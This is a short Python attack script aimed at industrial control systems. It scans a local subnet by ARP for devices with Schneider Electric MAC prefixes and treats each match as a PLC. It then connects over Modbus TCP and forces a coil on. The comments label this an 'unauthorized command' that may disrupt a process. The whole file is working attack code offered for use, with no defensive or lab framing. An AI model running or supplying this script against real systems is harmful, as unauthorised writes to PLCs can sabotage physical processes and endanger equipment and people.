from scapy.all import ARP, Ether, srp
from pyModbusTCP.client import ModbusClient
import time

# Schneider Electric MAC address prefixes (common ones)
SCHNEIDER_MAC_PREFIXES = ["00:80:F4", "00:21:91", "00:67:2A"]

# Function to scan the network
def find_plc_ip(network="192.168.1.0/24"):
    print("[*] Scanning for the Schneider Electric PLC on the network...")
    
    # Send ARP request broadcast
    arp_request = ARP(pdst=network)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    answered, _ = srp(broadcast / arp_request, timeout=3, verbose=False)
    
    for sent, received in answered:
        mac_address = received.hwsrc.upper()
        ip_address = received.psrc
        # Check if MAC matches Schneider Electric vendor
        if any(mac_address.startswith(prefix) for prefix in SCHNEIDER_MAC_PREFIXES):
            print(f"[+] Found Schneider Electric PLC at IP: {ip_address} (MAC: {mac_address})")
            return ip_address

    print("[-] No Schneider Electric PLC found. Exiting.")
    return None

# Function to send unauthorized Modbus command
def send_unauthorized_command(plc_ip):
    print(f"[*] Attempting to send unauthorized command to {plc_ip}...")
    
    # Connect to the PLC using Modbus TCP
    plc = ModbusClient(host=plc_ip, port=502, auto_open=True)

    if not plc.open():
        print("[-] Could not connect to the PLC (Modbus port 502 not responding).")
        return False

    # Example: Forcing Coil (DO) 0 to ON, potentially disrupting normal process
    unauthorized_register = 0  # Address of the coil/register to write (change as needed)
    unauthorized_value = 1     # Writing '1' to force ON a function
    
    success = plc.write_single_coil(unauthorized_register, unauthorized_value)

    if success:
        print(f"[+] Successfully sent unauthorized command: Coil {unauthorized_register} set to {unauthorized_value}.")
    else:
        print("[-] Failed to send unauthorized command.")

    plc.close()

# Main execution
if __name__ == "__main__":
    plc_ip = find_plc_ip("192.168.1.0/24")  # Adjust subnet if needed
    if plc_ip:
        send_unauthorized_command(plc_ip)